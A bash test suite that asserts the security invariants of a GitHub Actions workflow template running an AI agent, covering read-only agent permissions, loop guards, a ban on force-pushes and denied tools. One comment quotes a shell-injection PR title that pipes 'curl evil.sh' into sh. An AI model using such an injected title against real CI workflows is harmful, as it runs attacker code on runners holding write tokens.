#!/usr/bin/env bash
# The post-merge workflow's security invariants.
#
# This file is rendered into other people's repositories and runs with a write
# token. Every property below is one someone could plausibly remove while
# "simplifying" the workflow, and each removal is silently exploitable rather
# than loudly broken.

_dossier_test_begin "workflow-template"

WF="plugins/dossier/templates/ci/dossier-docs-refresh.yml"
assert_file_exists "$WF" "workflow template exists"

BODY=$(cat "$WF" 2>/dev/null)

# --- Parses as YAML ----------------------------------------------------------
if command -v python3 >/dev/null 2>&1 && python3 -c 'import yaml' 2>/dev/null; then
  # Placeholders are substituted at render time and are not valid YAML values in
  # every position, so substitute plausible values before parsing.
  TMP=$(mktemp 2>/dev/null) || TMP="/tmp/dossier-wf.$$"
  # The path-filter placeholder sits at column 0 and setup renders an indented
  # block sequence into it; reproduce that indentation or the parse is testing
  # the wrong document.
  sed -e 's/^{{DOSSIER_PATH_FILTERS}}/      - "src\/**"/' \
      -e "s/{{DOSSIER_SCHEDULE_CRON}}/0 6 * * 1/" \
      -e 's/{{DOSSIER_TRIGGER_EVENT}}/pull_request/' \
      -e 's/{{DOSSIER_ROLLING_BRANCH}}/docs\/dossier/' \
      -e 's/{{DOSSIER_DOCS_DIR}}/docs\/dossier/' \
      -e 's/{{DOSSIER_MARKETPLACE_URL}}/https:\/\/example.invalid\/m.git/' \
      -e 's/{{DOSSIER_MARKETPLACE_REPO}}/synaptiai\/synapti-marketplace/' \
      -e 's/{{DOSSIER_REF}}/v1.0.0/' \
      -e 's/{{DOSSIER_PLUGIN_VERSION}}/1.0.0/' \
      -e 's/{{DOSSIER_LABEL_GENERATED}}/dossier:generated/' \
      -e 's/{{DOSSIER_LABEL_SKIP}}/docs:skip/' \
      -e 's/{{DOSSIER_LABEL_OVERSIZED}}/dossier:oversized/' \
      "$WF" > "$TMP"
  if python3 -c "import yaml,sys; yaml.safe_load(open(sys.argv[1]))" "$TMP" 2>/dev/null; then
    _dossier_assert_pass "workflow parses as YAML after placeholder substitution"
  else
    _dossier_assert_fail "workflow does not parse as YAML: $(python3 -c "import yaml,sys; yaml.safe_load(open(sys.argv[1]))" "$TMP" 2>&1 | tail -1)"
  fi
  rm -f "$TMP" 2>/dev/null
else
  _dossier_assert_pass "yaml module unavailable — parse check skipped, structural checks still run"
fi

# --- Privilege split ---------------------------------------------------------
# Three jobs, and the agent job must never hold a write token.
for job in "  policy:" "  refresh:" "  publish:"; do
  assert_contains "$job" "$BODY" "job ${job# } declared"
done

assert_match '^permissions: \{\}' "$BODY" "top-level permissions is empty — per-job grants only"

# The refresh job (the one running the agent) must have contents: read.
REFRESH_BLOCK=$(awk '/^  refresh:/{f=1} /^  publish:/{f=0} f' "$WF")
assert_contains "contents: read" "$REFRESH_BLOCK" "refresh job has contents: read"
assert_not_contains "contents: write" "$REFRESH_BLOCK" "refresh job has NO write permission"
assert_not_contains "pull-requests: write" "$REFRESH_BLOCK" "refresh job cannot open PRs"
assert_contains "persist-credentials: false" "$REFRESH_BLOCK" "refresh job does not persist git credentials"

# The publish job holds the write token and must run no agent.
PUBLISH_BLOCK=$(awk '/^  publish:/{f=1} f' "$WF")
assert_contains "contents: write" "$PUBLISH_BLOCK" "publish job has contents: write"
assert_not_contains "anthropics/claude-code-action" "$PUBLISH_BLOCK" "publish job runs NO agent"
assert_not_contains "ANTHROPIC_API_KEY" "$PUBLISH_BLOCK" "publish job never sees the Anthropic key"

# The agent runs exactly once, in the refresh job.
ACTION_COUNT=$(grep -c 'uses: anthropics/claude-code-action' "$WF" 2>/dev/null || echo 0)
assert_equal "1" "$ACTION_COUNT" "the agent action appears exactly once"
assert_contains "anthropics/claude-code-action" "$REFRESH_BLOCK" "the agent runs in the refresh job"

# --- Loop prevention ---------------------------------------------------------
# Four independent guards, evaluated by GitHub before a runner is allocated.
assert_contains "merged == true" "$BODY" "guard: only merged pull requests"
assert_contains "startsWith(github.event.pull_request.head.ref" "$BODY" "guard: head-ref prefix"
assert_contains "labels.*.name" "$BODY" "guard: label checks"
assert_contains "github-actions[bot]" "$BODY" "guard: bot actor"

# --- No force-push anywhere --------------------------------------------------
# Fetch refspecs legitimately use a leading +; pushes must not.
if grep -E '^\s*git push' "$WF" | grep -qE '(--force|--force-with-lease|[[:space:]]\+refs)'; then
  _dossier_assert_fail "workflow contains a forced push"
else
  _dossier_assert_pass "no forced push anywhere"
fi

# Merge-forward, never rebase — a rebase would require the force-push above.
if grep -qE '^\s*git rebase' "$WF"; then
  _dossier_assert_fail "workflow rebases the docs branch"
else
  _dossier_assert_pass "no rebase (merge-forward only)"
fi

# --- Shell injection ---------------------------------------------------------
# Untrusted values must reach shell as env vars, never as ${{ }} interpolation
# inside a run: body. A PR titled '; curl evil.sh | sh; #' would otherwise run.
VIOLATIONS=$(awk '
  /run: *\|?/ { inrun=1; indent=match($0, /[^ ]/); next }
  inrun && NF && match($0, /[^ ]/) <= indent { inrun=0 }
  inrun && /\$\{\{ *(github\.event|inputs\.|github\.head_ref)/ { print NR": "$0 }
' "$WF")
if [ -z "$VIOLATIONS" ]; then
  _dossier_assert_pass "no untrusted \${{ }} interpolation inside any run: block"
else
  _dossier_assert_fail "untrusted interpolation inside run: — $(printf '%s' "$VIOLATIONS" | head -2)"
fi

# --- Concurrency and history -------------------------------------------------
assert_contains "concurrency:" "$BODY" "workflow serializes runs"
assert_contains "cancel-in-progress: false" "$BODY" "runs are not cancelled mid-agent"
assert_contains "fetch-depth: 0" "$BODY" "full history — a shallow clone silently yields the wrong range"

# github.sha is the test-merge commit on pull_request events, not a commit on
# the base branch. Using it produces a range that looks right and is not.
assert_contains "merge_commit_sha" "$BODY" "uses merge_commit_sha, not github.sha"

# --- Credential preflight fails loudly ---------------------------------------
assert_contains "::error" "$BODY" "emits an error annotation on misconfiguration"
assert_contains "gh secret set" "$BODY" "remediation names the exact command"
assert_contains "not permitted to create" "$BODY" "handles the Actions-cannot-create-PRs failure"

# --- Plugin install ----------------------------------------------------------
assert_contains "plugin_marketplaces" "$BODY" "installs the marketplace"
assert_contains "dossier@synapti-marketplace" "$BODY" "installs the dossier plugin"
assert_contains "/dossier:refresh" "$BODY" "invokes the refresh command"

# --- Tool restriction --------------------------------------------------------
assert_contains "allowedTools" "$BODY" "restricts the agent's tools"
assert_contains "disallowedTools" "$BODY" "explicitly denies dangerous tools"
for denied in "WebFetch" "git push"; do
  DIS=$(grep -A3 'disallowedTools' "$WF" | head -8)
  assert_contains "$denied" "$DIS" "denies $denied"
done

# --- Prompt is static --------------------------------------------------------
# The prompt carries a path, never attacker-controlled content.
PROMPT_LINE=$(grep -E '^\s*prompt:' "$WF" | head -1)
if printf '%s' "$PROMPT_LINE" | grep -q 'github.event'; then
  _dossier_assert_fail "prompt interpolates event data — it must carry a path only"
else
  _dossier_assert_pass "prompt is static (carries a path, not content)"
fi

# --- Managed-file stamp placeholder ------------------------------------------
assert_contains "{{DOSSIER_ROLLING_BRANCH}}" "$BODY" "branch prefix is render-time substituted"
assert_contains "{{DOSSIER_DOCS_DIR}}" "$BODY" "docs dir is render-time substituted"

_dossier_test_summary
